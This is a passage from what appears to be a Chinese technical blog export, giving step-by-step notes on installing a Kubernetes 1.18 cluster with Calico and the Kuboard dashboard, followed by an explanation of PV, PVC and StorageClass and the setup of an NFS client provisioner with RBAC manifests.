class=\"language-bash\">用于为普通用户分配kubectl权限</span></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>安装Calico网络插件</p>\n<p>集群必须安装网络插件以实现Pod间通信，只需要在Master节点操作，其他Node节点会自动创建相关Pod。<br>该配置文件默认采用的Pod的IP地址为192.168.0.0&#x2F;16，需要修改为集群初始化参数中采用的值，本例中为10.10.0.0&#x2F;16；</p>\n</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget https://docs.projectcalico.org/v3.8/manifests/calico.yaml</span><br><span class=\"line\"></span><br><span class=\"line\">sed -i &quot;s#192\\.168\\.0\\.0/16#10\\.10\\.0\\.0/16#&quot; calico.yaml</span><br><span class=\"line\">kubectl apply -f calico.yaml</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>监控容器状态，等待所有容器状态处于Running状态</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">watch -n 2 kubectl get pods -n kube-system -o wide</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>检查Master的状态，看到下面的结果就说明初始化成功了！！！</li>\n</ul>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]<span class=\"comment\"># kubectl get nodes -o wide</span></span><br><span class=\"line\">NAME      STATUS   ROLES    AGE     VERSION   INTERNAL-IP     EXTERNAL-IP   OS-IMAGE                KERNEL-VERSION           CONTAINER-RUNTIME</span><br><span class=\"line\">master1   Ready    master   3m33s   v1.18.4   192.168.0.132   &lt;none&gt;        CentOS Linux 7 (Core)   3.10.0-1127.el7.x86_64   docker://19.3.12</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost ~]<span class=\"comment\"># kubectl get pods --all-namespaces</span></span><br><span class=\"line\">NAMESPACE     NAME                                      READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">kube-system   calico-kube-controllers-75d555c48-v286d   1/1     Running   0          2m36s</span><br><span class=\"line\">kube-system   calico-node-vz9v2                         1/1     Running   0          2m36s</span><br><span class=\"line\">kube-system   coredns-546565776c-crk2r                  1/1     Running   0          3m28s</span><br><span class=\"line\">kube-system   coredns-546565776c-n6kmm                  1/1     Running   0          3m28s</span><br><span class=\"line\">kube-system   etcd-master1                              1/1     Running   0          3m38s</span><br><span class=\"line\">kube-system   kube-apiserver-master1                    1/1     Running   0          3m38s</span><br><span class=\"line\">kube-system   kube-controller-manager-master1           1/1     Running   0          3m38s</span><br><span class=\"line\">kube-system   kube-proxy-bggcp                          1/1     Running   0          3m29s</span><br><span class=\"line\">kube-system   kube-scheduler-master1                    1/1     Running   0          3m38s</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Step-5-安装Kuboard监控面板\"><a href=\"#Step-5-安装Kuboard监控面板\" class=\"headerlink\" title=\"Step 5. 安装Kuboard监控面板\"></a>Step 5. 安装Kuboard监控面板</h2><ul>\n<li>在Master节点,安装<a href=\"https://github.com/nginxinc/kubernetes-ingress/blob/v1.5.3/docs/installation.md\">Ingress Controller</a></li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://kuboard.cn/install-script/v1.16.0/nginx-ingress.yaml</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在Master节点执行，在线下载并启用Kuboard监控工具包（由kuboard.cn提供，不是默认的Dashboard）</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl apply -f https://kuboard.cn/install-script/kuboard.yaml</span><br><span class=\"line\">kubectl apply -f https://addons.kuboard.cn/metrics-server/0.3.6/metrics-server.yaml</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>持续监控pod运行情况，直到如下信息就说明成功了</li>\n</ul>\n<figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ kubectl get pods -l k8s.kuboard.cn/name=kuboard -n kube-system</span><br><span class=\"line\"></span><br><span class=\"line\">NAME                       READY   STATUS        RESTARTS   AGE</span><br><span class=\"line\">kuboard-<span class=\"number\">54</span>c9c4f6cb-<span class=\"number\">6</span>lf88   <span class=\"number\">1</span>/<span class=\"number\">1</span>     Running       <span class=\"number\">0</span>          <span class=\"number\">45</span>s</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在第一个Master节点，以admin角色获取登录的Token，当然也可以是普通用户的角色</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取admin用户的Token</span></span><br><span class=\"line\">echo $(kubectl -n kube-system get secret $(kubectl -n kube-system get secret | grep kuboard-user | awk &#x27;&#123;print $1&#125;&#x27;) -o go-template=&#x27;&#123;&#123;.data.token&#125;&#125;&#x27; | base64 -d)</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">获取普通用户的Token</span></span><br><span class=\"line\">echo $(kubectl -n kube-system get secret $(kubectl -n kube-system get secret | grep kuboard-viewer | awk &#x27;&#123;print $1&#125;&#x27;) -o go-template=&#x27;&#123;&#123;.data.token&#125;&#125;&#x27; | base64 -d)</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>注意：Mac OS的base64指令有差异，<code>base64 -d</code> 更改为 <code>base64 -D</code></p>\n</blockquote>\n<ul>\n<li>浏览器打开地址: <code>http://192.168.0.210:32567</code>，访问主监控界面，并粘贴上一步的屏幕显示输入Token</li>\n</ul>\n<img src=\"/2020/06/25/Kubernetes%E9%9B%86%E7%BE%A4%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/dashboard.png\" class=\"\">\n\n<hr>\n<h2 id=\"Step-6-Worker节点部署（可选）\"><a href=\"#Step-6-Worker节点部署（可选）\" class=\"headerlink\" title=\"Step 6: Worker节点部署（可选）\"></a>Step 6: Worker节点部署（可选）</h2><ul>\n<li><p>每一个Worker节点都需要完成步骤1-3，设置操作系统，并安装docker、kubertnetes等软件包</p>\n</li>\n<li><p>在Worker节点上，配置 APISERVER 的地址信息，实际上就是在<code>/etc/hosts</code>中增加如下域名:</p>\n</li>\n</ul>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">192.168.0.210    master1</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>在Master节点上，获得允许Worker节点加入的Token信息，有两种方法：</p>\n<p>方式1: 初始化第一个 master 节点时的输出内容中，第25、26行就是用来初始化 worker 节点的命令。该 token 的有效时间为 2 个小时，2小时内可以使用此 token 初始化任意数量的 worker 节点。</p>\n<p>方式2: 如果Master节点的初始化Token已经失效，则使用命令<code>kubeadm token create --print-join-command</code>，输出内容就包含该Token和指令样板</p>\n</li>\n<li><p>在Worker节点上，按照上一步骤中Master节点提供的信息，粘贴并执行以下类似的命令</p>\n</li>\n</ul>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubeadm <span class=\"built_in\">join</span> master1:6443 --token c4y5zm.rarmxapvrozfslcr \\</span><br><span class=\"line\">    -discovery-token-ca-cert-hash sha256:a9e20cf7f87c372b1ed7fe0f43e622b3e62154ff9e1e63312c110b4102417399 \\</span><br><span class=\"line\">    --control-plane --certificate-key 27e02e3b6744beccd16aa878891e074aa7ae45b430848fdfc924a9480200de13</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>如果Worker节点加入集群重，在Dashboard上将可以看到新的Node节点</p>\n<p>  如果失败，请执行<code>kubeadm reset</code>重新初始化，并分析错误原因再次尝试</p>\n</li>\n<li><p>初始化第一个 master 节点时的输出内容中，第25、26行就是用来初始化 worker 节点的命令，如下所示：此时请不要执行该命令</p>\n</li>\n</ul>\n<h2 id=\"Step-7-移除Worker节点（参考）\"><a href=\"#Step-7-移除Worker节点（参考）\" class=\"headerlink\" title=\"Step 7. 移除Worker节点（参考）\"></a>Step 7. 移除Worker节点（参考）</h2><ol>\n<li><p>在准备移除的 worker 节点上，执行<code>kubeadm reset</code></p>\n</li>\n<li><p>在第一个 master 节点上，执行<code>kubectl delete node worker1</code>。</p>\n<p> worker节点的名字可执行 <code>kubectl get nodes</code> 命令获得</p>\n</li>\n</ol>\n<h2 id=\"Step-8-移除Master节点（参考）\"><a href=\"#Step-8-移除Master节点（参考）\" class=\"headerlink\" title=\"Step 8. 移除Master节点（参考）\"></a>Step 8. 移除Master节点（参考）</h2><ol>\n<li><p>在准备移除的 Master 节点上，执行<code>kubeadm reset</code></p>\n</li>\n<li><p>如果想要再次启动Master节点，重复Step4、Step5即可</p>\n</li>\n</ol>\n<hr>\n<h2 id=\"问题记录\"><a href=\"#问题记录\" class=\"headerlink\" title=\"问题记录\"></a>问题记录</h2><h3 id=\"1-关于Docker的Cgroup-Driver驱动程序\"><a href=\"#1-关于Docker的Cgroup-Driver驱动程序\" class=\"headerlink\" title=\"1. 关于Docker的Cgroup Driver驱动程序\"></a>1. 关于Docker的Cgroup Driver驱动程序</h3><p>Cgroups是control groups的缩写，是Linux内核提供的一种可以限制、记录、隔离进程组（process groups）所使用的物理资源（如：cpu,memory,IO等等）的机制。最初由google的工程师提出，后来被整合进Linux内核。Cgroups也是LXC为实现虚拟化所使用的资源管理手段，可以说没有cgroups就没有LXC。</p>\n<p>要理解 systemd 与 cgroups 的关系，我们需要先区分 cgroups 的两个方面：层级结构(A)和资源控制(B)。首先 cgroups 是以层级结构组织并标识进程的一种方式，同时它也是在该层级结构上执行资源限制的一种方式。我们简单的把 cgroups 的层级结构称为 A，把 cgrpups 的资源控制能力称为 B。<br>对于 systemd 来说，A 是必须的，如果没有 A，systemd 将不能很好的工作。而 B 则是可选的，如果你不需要对资源进行控制，那么在编译 Linux 内核时完全可以去掉 B 相关的编译选项。</p>\n<p>docker 17.03使用的Cgroup Driver为<code>cgroupfs</code>，而kubelet 1.8.1 使用的cgroup driver为<code>systemd</code>,这里需要修改docker的Cgroup Driver，和kubelet 保持一致！</p>\n<h3 id=\"2-关于kubelet启动报错\"><a href=\"#2-关于kubelet启动报错\" class=\"headerlink\" title=\"2. 关于kubelet启动报错\"></a>2. 关于kubelet启动报错</h3><p>在使用systemctl启动kubelet以后，其日志显示错误信息：<code>Process: 11794 ExecStart=/usr/bin/kubelet $KUBELET_KUBECONFIG_ARGS $KUBELET_CONFIG_ARGS $KUBELET_KUBEADM_ARGS $KUBELET_EXTRA_ARGS (code=exited, status=255)</code></p>\n<p>问题分析：该错误说明kubelet尚未启动，原因是Master节点尚未完成初始化</p>\n<p>解决办法：不管他！等Master节点init完成后，自然就恢复正常了。</p>\n<h3 id=\"3-Master节点启动-kubeadm-init-失败\"><a href=\"#3-Master节点启动-kubeadm-init-失败\" class=\"headerlink\" title=\"3. Master节点启动 kubeadm init 失败\"></a>3. Master节点启动 kubeadm init 失败</h3><p>本次安装默认K8s的版本是<code>1.18.4</code>，报错信息显示时无法正常拉取默认镜像版本。</p>\n<p>解决办法是：强制修改K8s的版本号为<code>1.18.2</code>，结果下载成功!!!</p>\n<h3 id=\"4-Master节点无法启动metrics-server\"><a href=\"#4-Master节点无法启动metrics-server\" class=\"headerlink\" title=\"4. Master节点无法启动metrics-server\"></a>4. Master节点无法启动<code>metrics-server</code></h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]<span class=\"comment\"># kubectl get pods -A</span></span><br><span class=\"line\">NAMESPACE     NAME                                      READY   STATUS    RESTARTS   AGE</span><br><span class=\"line\">kube-system   calico-kube-controllers-75d555c48-fl5nw   1/1     Running   0          8m44s</span><br><span class=\"line\">kube-system   calico-node-hkz4f                         1/1     Running   0          8m44s</span><br><span class=\"line\">kube-system   coredns-546565776c-6c6sj                  1/1     Running   0          9m14s</span><br><span class=\"line\">kube-system   coredns-546565776c-rk7zx                  1/1     Running   0          9m14s</span><br><span class=\"line\">kube-system   etcd-master1                              1/1     Running   0          9m31s</span><br><span class=\"line\">kube-system   kube-apiserver-master1                    1/1     Running   0          9m31s</span><br><span class=\"line\">kube-system   kube-controller-manager-master1           1/1     Running   0          9m31s</span><br><span class=\"line\">kube-system   kube-proxy-l62qs                          1/1     Running   0          9m14s</span><br><span class=\"line\">kube-system   kube-scheduler-master1                    1/1     Running   0          9m30s</span><br><span class=\"line\">kube-system   kuboard-7bb89b4cc4-gm2jq                  1/1     Running   0          4m24s</span><br><span class=\"line\">kube-system   metrics-server-7f96bbcc66-dfhs2           0/1     Pending   0          4m19s</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost ~]<span class=\"comment\"># kubectl describe nodes</span></span><br><span class=\"line\">Name:               master1</span><br><span class=\"line\">Roles:              master</span><br><span class=\"line\">Labels:             beta.kubernetes.io/arch=amd64</span><br><span class=\"line\">                    beta.kubernetes.io/os=linux</span><br><span class=\"line\">                    kubernetes.io/arch=amd64</span><br><span class=\"line\">                    kubernetes.io/hostname=master1</span><br><span class=\"line\">                    kubernetes.io/os=linux</span><br><span class=\"line\">                    node-role.kubernetes.io/master=</span><br><span class=\"line\">Annotations:        kubeadm.alpha.kubernetes.io/cri-socket: /var/run/dockershim.sock</span><br><span class=\"line\">                    node.alpha.kubernetes.io/ttl: 0</span><br><span class=\"line\">                    projectcalico.org/IPv4Address: 192.168.0.81/24</span><br><span class=\"line\">                    projectcalico.org/IPv4IPIPTunnelAddr: 10.10.137.64</span><br><span class=\"line\">                    volumes.kubernetes.io/controller-managed-attach-detach: <span class=\"literal\">true</span></span><br><span class=\"line\">CreationTimestamp:  Sat, 04 Jul 2020 02:50:40 -0400</span><br><span class=\"line\">Taints:             node-role.kubernetes.io/master:NoSchedule</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>这就是为什么master1+worker1的配置时，metrics自动好了的原因，因为默认master1不运行应用pod</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">kubectl taint nodes --all node-role.kubernetes.io/master-</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h2><ul>\n<li><a href=\"https://developer.aliyun.com/article/763983?spm=a2c6h.12873581.0.0.1bb92784z8JOcM&groupCode=mirror\">Kubernetes集群安装手册-阿里云社区</a></li>\n<li><a href=\"https://kuboard.cn/install/install-k8s.html\">Kubernetes集群安装手册-kuboard.cn的测试手册</a></li>\n<li><a href=\"https://www.cnblogs.com/kelelipeng/p/10371593.html\">关于SELINUX的详细介绍</a></li>\n</ul>\n"},{"title":"Kubetnetes集群配置NFS StorageClass的操作记录","url":"/2020/08/16/Kubetnetes%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AENFS-StorageClass%E7%9A%84%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/","content":"<h2 id=\"关于Kubernetes-Volume\"><a href=\"#关于Kubernetes-Volume\" class=\"headerlink\" title=\"关于Kubernetes Volume\"></a>关于Kubernetes Volume</h2><p>Kubernetes 和 Docker 类似，也是通过 Volume 的方式提供对存储的支持，Volume 被定义在 Pod 上，可以被 Pod 里的多个容器挂载到相同或不同的路径下。<br>但是，Kubernetes 中 Volume 的 概念与Docker 中的 Volume 也存在重大区别，具体区别如下：</p>\n<ul>\n<li>Kubernetes 中的 Volume 与 Pod 的生命周期相同，但与容器的生命周期不相关。当容器终止或重启时，Volume 中的数据也不会丢失。</li>\n<li>当 Pod 被删除时，Volume 才会被清理。并且数据是否丢失取决于 Volume 的具体类型，比如：emptyDir 类型的 Volume 数据会丢失，而 PV 类型的数据则不会丢失。</li>\n</ul>\n<p>Volume 的核心是目录，可以通过 Pod 中的容器来访问。该目录是如何形成的、支持该目录的介质以及其内容取决于所使用的特定卷类型。要使用 Volume，需要为 Pod 指定为 Volume (<code>spec.volumes</code> 字段) 以及将它挂载到容器的位置 (<code>spec.containers.volumeMounts</code> 字段)。Kubernetes 支持多种类型的卷，一个 Pod 可以同时使用多种类型的 Volume。</p>\n<p>容器中的进程看到的是由其 Docker 镜像和 Volume 组成的文件系统视图。 Docker 镜像位于文件系统层次结构的根目录，任何 Volume 都被挂载在镜像的指定路径中。Volume 无法挂载到其他 Volume 上或与其他 Volume 的硬连接。Pod 中的每个容器都必须独立指定每个 Volume 的挂载位置。</p>\n<p>Kubernetes 目前支持多种 Volume 类型，大致如下：</p>\n<ul>\n<li><p><code>emptryDir</code>: 顾名思义是一个空目录，它的生命周期和所属的 Pod 是完全一致的，主要用于某些应用程序无需永久保存的临时目录，在多个容器之间共享数据等。<br>缺省情况下，emptryDir 是使用主机磁盘进行存储的。你也可以使用其它介质作为存储，比如：网络存储、内存等。设置 <code>emptyDir.medium</code> 字段的值为 Memory 就可以使用内存进行存储，使用内存做为存储可以提高整体速度，但是要注意一旦机器重启，内容就会被清空，并且也会受到容器内存的限制。</p>\n</li>\n<li><p><code>hostPath</code>: hostPath 类型的 Volume 允许用户挂载 Node 宿主机上的文件或目录到 Pod 中。大多数 Pod 都用不到这种 Volume，其缺点比较明显，比如：Pod 在不同节点上的行为可能会有所不同；在底层主机上创建的文件或目录只能由 root 写入，您需要在特权容器中以 root 身份运行进程等。</p>\n<p>  这种类型的 Volume 主要用在以下场景中：</p>\n<ul>\n<li>运行中的容器需要访问 Docker 内部的容器，使用 &#x2F;var&#x2F;lib&#x2F;docker 来做为 hostPath 让容器内应用可以直接访问 Docker 的文件系统。在容器中运行 cAdvisor，使用 &#x2F;dev&#x2F;cgroups 来做为 hostPath。</li>\n<li>和 DaemonSet 搭配使用，用来操作主机文件。例如：日志采集方案 FLK 中的 FluentD 就采用这种方式来加载主机的容器日志目录，达到收集本主机所有日志的目的。</li>\n</ul>\n</li>\n<li><p><code>secret</code>： secret volume用于将敏感信息（如密码）传递给pod。可以将secrets存储在Kubernetes API中，使用的时候以文件的形式挂载到pod中，而不用连接api。 secret volume由tmpfs（RAM支持的文件系统）支持。</p>\n</li>\n<li><p><code>persistentVolumeClaim</code>:  persistentVolumeClaim用来挂载持久化磁盘的。PersistentVolumes是用户在不知道特定云环境的细节的情况下，实现持久化存储（如GCE PersistentDisk或iSCSI卷）的一种方式。这是最主要的存储持久化方案，也是本文讨论的重点</p>\n</li>\n</ul>\n<p>当然，Kubernetes还支持cephfs、glusterfs等分布式存储，和awsElasticBlockStore、azureFileVolume等云计算厂商的存储方案，以及Flocker等开源的容器集群数据卷管理器等。</p>\n<h2 id=\"关于PV、PVC和SC\"><a href=\"#关于PV、PVC和SC\" class=\"headerlink\" title=\"关于PV、PVC和SC\"></a>关于PV、PVC和SC</h2><p>先介绍Kubernetes存储管理的几个核心概念：</p>\n<ul>\n<li>持久化卷（PV - PersistentVolume)：负责提供网络存储资源，是对底层的共享存储的一种抽象，PV 由管理员进行创建和配置，它和具体的底层的共享存储技术的实现方式有关，比如 Ceph、GlusterFS、NFS 等，都是通过插件机制完成与共享存储的对接。</li>\n<li>持久化卷声明（PVC - PersistentVolumeClaim)：负责为POD请求存储资源。PVC 是用户存储的一种声明，PVC 和 Pod 比较类似，Pod 消耗的是节点，PVC 消耗的是 PV 资源，Pod 可以请求 CPU 和内存，而 PVC 可以请求特定的存储空间和访问模式。对于真正使用存储的用户不需要关心底层的存储实现细节，只需要直接使用 PVC 即可。</li>\n<li>存储类（SC - StorageClass）：负责动态创建 PV，可以封装不同类型的存储供 PVC 选用。通过 StorageClass 的定义，管理员可以将存储资源定义为某种类型的资源，比如快速存储、慢速存储等，用户根据 StorageClass 的描述就可以非常直观的知道各种存储资源的具体特性了，这样就可以根据应用的特性去申请合适的存储资源了。</li>\n</ul>\n<img src=\"/2020/08/16/Kubetnetes%E9%9B%86%E7%BE%A4%E9%85%8D%E7%BD%AENFS-StorageClass%E7%9A%84%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/sc.png\" class=\"\">\n\n<p>StorageClass 包括四个部分:</p>\n<ul>\n<li>provisioner：指定 Volume 插件的类型，包括内置插件（如 kubernetes.io&#x2F;glusterfs）和外部插件（如 external-storage 提供的 ceph.com&#x2F;cephfs）。</li>\n<li>mountOptions：指定挂载选项，当 PV 不支持指定的选项时会直接失败。比如 NFS 支持 <code>hard</code> 和 <code>nfsvers=4.1</code>等选项。</li>\n<li>parameters：指定 provisioner 的选项，比如 kubernetes.io&#x2F;aws-ebs 支持 type、zone、iopsPerGB 等参数。</li>\n<li>reclaimPolicy：指定回收策略，同 PV 的回收策略。</li>\n</ul>\n<h2 id=\"配置步骤\"><a href=\"#配置步骤\" class=\"headerlink\" title=\"配置步骤\"></a>配置步骤</h2><h3 id=\"1-创建NFS服务\"><a href=\"#1-创建NFS服务\" class=\"headerlink\" title=\"1. 创建NFS服务\"></a>1. 创建NFS服务</h3><p>NFS SERVER的安装方法参见<a href=\"https://developer.aliyun.com/article/610391\">安装NFS服务</a><br>Client的配置参数为：</p>\n<ul>\n<li>服务地址：    <code>192.168.0.200</code></li>\n<li>共享数据目录： <code>/data</code></li>\n</ul>\n<h3 id=\"2-部署存储供应卷\"><a href=\"#2-部署存储供应卷\" class=\"headerlink\" title=\"2. 部署存储供应卷\"></a>2. 部署存储供应卷</h3><p>实际上就是部署一个运行NFS Client的Container，其任务是使用我们已经配置好的 nfs 服务器，并根据PVC的请求, 动态创建持久卷，也就是自动帮我们创建PV。</p>\n<ul>\n<li>该容器的名称为<code>nfs-client-provisioner</code></li>\n<li>基础镜像来自于<code>quay.io/external_storage/nfs-client-provisioner:latest</code>，当前版本号为<code>v3.1.0-k8s1.11</code></li>\n<li>供应者(provisioner)的名称为<code>fuseim.pri/ifs</code></li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; nfs-client.yaml &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">kind: Deployment</span></span><br><span class=\"line\"><span class=\"string\">apiVersion: apps/v1</span></span><br><span class=\"line\"><span class=\"string\">metadata:</span></span><br><span class=\"line\"><span class=\"string\">  name: nfs-client-provisioner</span></span><br><span class=\"line\"><span class=\"string\">spec:</span></span><br><span class=\"line\"><span class=\"string\">  replicas: 1</span></span><br><span class=\"line\"><span class=\"string\">  strategy:</span></span><br><span class=\"line\"><span class=\"string\">    type: Recreate</span></span><br><span class=\"line\"><span class=\"string\">  selector:</span></span><br><span class=\"line\"><span class=\"string\">    matchLabels:</span></span><br><span class=\"line\"><span class=\"string\">      app: nfs-client-provisioner</span></span><br><span class=\"line\"><span class=\"string\">  template:</span></span><br><span class=\"line\"><span class=\"string\">    metadata:</span></span><br><span class=\"line\"><span class=\"string\">      labels:</span></span><br><span class=\"line\"><span class=\"string\">        app: nfs-client-provisioner</span></span><br><span class=\"line\"><span class=\"string\">    spec:</span></span><br><span class=\"line\"><span class=\"string\">      serviceAccountName: nfs-client-provisioner</span></span><br><span class=\"line\"><span class=\"string\">      containers:</span></span><br><span class=\"line\"><span class=\"string\">        - name: nfs-client-provisioner</span></span><br><span class=\"line\"><span class=\"string\">          image: quay.io/external_storage/nfs-client-provisioner:latest</span></span><br><span class=\"line\"><span class=\"string\">          volumeMounts:</span></span><br><span class=\"line\"><span class=\"string\">            - name: nfs-client-root</span></span><br><span class=\"line\"><span class=\"string\">              mountPath: /persistentvolumes</span></span><br><span class=\"line\"><span class=\"string\">          env:</span></span><br><span class=\"line\"><span class=\"string\">            - name: PROVISIONER_NAME</span></span><br><span class=\"line\"><span class=\"string\">              value: fuseim.pri/ifs</span></span><br><span class=\"line\"><span class=\"string\">            - name: NFS_SERVER</span></span><br><span class=\"line\"><span class=\"string\">              value: 192.168.0.130        # &lt; Your NFS Server IP &gt;</span></span><br><span class=\"line\"><span class=\"string\">            - name: NFS_PATH</span></span><br><span class=\"line\"><span class=\"string\">              value: /data                # &lt; Your NFS Server MountDir &gt;</span></span><br><span class=\"line\"><span class=\"string\">      volumes:</span></span><br><span class=\"line\"><span class=\"string\">        - name: nfs-client-root</span></span><br><span class=\"line\"><span class=\"string\">          nfs:</span></span><br><span class=\"line\"><span class=\"string\">            server: 192.168.0.130       # &lt; Your NFS Server IP &gt;</span></span><br><span class=\"line\"><span class=\"string\">            path: /data                 # &lt; Your NFS Server MountDir &gt;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-为存储供应卷创建并绑定权限规则集\"><a href=\"#3-为存储供应卷创建并绑定权限规则集\" class=\"headerlink\" title=\"3. 为存储供应卷创建并绑定权限规则集\"></a>3. 为存储供应卷创建并绑定权限规则集</h3><p>由于Kubernetes 1.6以后默认开启RABC，因此必须配置权限规则。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; nfs-client-sa.yaml &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">apiVersion: v1</span></span><br><span class=\"line\"><span class=\"string\">kind: ServiceAccount</span></span><br><span class=\"line\"><span class=\"string\">metadata:</span></span><br><span class=\"line\"><span class=\"string\">  name: nfs-client-provisioner</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">---</span></span><br><span class=\"line\"><span class=\"string\">kind: ClusterRole</span></span><br><span class=\"line\"><span class=\"string\">apiVersion: rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"string\">metadata:</span></span><br><span class=\"line\"><span class=\"string\">  name: nfs-client-provisioner-runner</span></span><br><span class=\"line\"><span class=\"string\">rules:</span></span><br><span class=\"line\"><span class=\"string\">  - apiGroups: [&quot;&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    resources: [&quot;persistentvolumes&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;delete&quot;]</span></span><br><span class=\"line\"><span class=\"string\">  - apiGroups: [&quot;&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    resources: [&quot;persistentvolumeclaims&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;]</span></span><br><span class=\"line\"><span class=\"string\">  - apiGroups: [&quot;storage.k8s.io&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    resources: [&quot;storageclasses&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    verbs: [&quot;get&quot;, &quot;list&quot;, &quot;watch&quot;]</span></span><br><span class=\"line\"><span class=\"string\">  - apiGroups: [&quot;&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    resources: [&quot;events&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    verbs: [&quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;patch&quot;]</span></span><br><span class=\"line\"><span class=\"string\">  - apiGroups: [&quot;&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    resources: [&quot;endpoints&quot;]</span></span><br><span class=\"line\"><span class=\"string\">    verbs: [&quot;create&quot;, &quot;delete&quot;, &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;patch&quot;, &quot;update&quot;]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">---</span></span><br><span class=\"line\"><span class=\"string\">kind: ClusterRoleBinding</span></span><br><span class=\"line\"><span class=\"string\">apiVersion: rbac.authorization.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"string\">metadata:</span></span><br><span class=\"line\"><span class=\"string\">  name: run-nfs-client-provisioner</span></span><br><span class=\"line\"><span class=\"string\">subjects:</span></span><br><span class=\"line\"><span class=\"string\">  - kind: ServiceAccount</span></span><br><span class=\"line\"><span class=\"string\">    name: nfs-client-provisioner</span></span><br><span class=\"line\"><span class=\"string\">    namespace: default</span></span><br><span class=\"line\"><span class=\"string\">roleRef:</span></span><br><span class=\"line\"><span class=\"string\">  kind: ClusterRole</span></span><br><span class=\"line\"><span class=\"string\">  name: nfs-client-provisioner-runner</span></span><br><span class=\"line\"><span class=\"string\">  apiGroup: rbac.authorization.k8s.io</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-部署storageclass\"><a href=\"#4-部署storageclass\" class=\"headerlink\" title=\"4. 部署storageclass\"></a>4. 部署storageclass</h3><p>定义StorageClass的名称为<code>nfs-client</code>，并从名为<code>fuseim.pri/ifs</code> 的provisioner获得动态PV资源，</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; nfs-client-class.yaml &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">apiVersion: storage.k8s.io/v1</span></span><br><span class=\"line\"><span class=\"string\">kind: StorageClass</span></span><br><span class=\"line\"><span class=\"string\">metadata:</span></span><br><span class=\"line\"><span class=\"string\">  name: nfs-client</span></span><br><span class=\"line\"><span class=\"string\">provisioner: fuseim.pri/ifs     # or choose another name, </span></span><br><span class=\"line\"><span class=\"string\">                                # must match deployment&#x27;s env PROVISIONER_NAME&#x27;</span></span><br><span class=\"line\"><span class=\"string\">parameters:</span></span><br><span class=\"line\"><span class=\"string\">  archiveOnDelete: &quot;false&quot;      # When set to &quot;false&quot; your PVs will not be archived</span></span><br><span class=\"line\"><span class=\"string\">                                # by the provisioner upon deletion of the PVC.</span></span><br><span class=\"line\"><span 